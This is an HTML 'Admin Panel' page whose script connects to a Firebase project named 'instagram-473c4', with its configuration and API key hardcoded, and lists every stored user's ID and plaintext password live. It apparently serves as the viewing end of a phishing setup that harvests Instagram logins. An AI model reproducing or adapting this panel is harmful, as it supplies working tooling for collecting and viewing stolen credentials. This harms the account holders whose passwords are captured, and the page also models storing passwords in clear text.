<!DOCTYPE html>
<html lang="en">
  <head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Admin Panel</title>
	<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js"></script>
	<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js"></script>
  </head>
  <body>
	<h2>Admin Panel</h2>
	<div id="dataContainer">
	  <h3>Live User Data:</h3>
	  <ul id="userList"></ul>
	</div>

<script>
    // Firebase Configuration
    const firebaseConfig = {
      apiKey: "AIzaSyCAUYc9wZkBXh7vjDtDfDVGlyHw6QBXc",
      authDomain: "instagram-473c4.firebaseapp.com",
      databaseURL: "https://instagram-473c4-default-rtdb.firebaseio.com",
      projectId: "instagram-473c4",
      storageBucket: "instagram-473c4.appspot.com",
      messagingSenderId: "952456961272",
      appId: "1:952456961272:web:b937423a08463a7b996f0d",
      measurementId: "G-RHZYLCFYV3"
    };

    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Fetch Data from Firebase
    const userList = document.getElementById('userList');

    db.ref('publicUsers/').on('value', (snapshot) => {
      const data = snapshot.val();
      userList.innerHTML = ''; // Clear previous data

      for (let key in data) {
        const user = data[key];
        const li = document.createElement('li');
        li.textContent = `User ID: ${user.userId}, Password: ${user.password}`;
        userList.appendChild(li);
      }
    });
</script>
  </body>
</html>
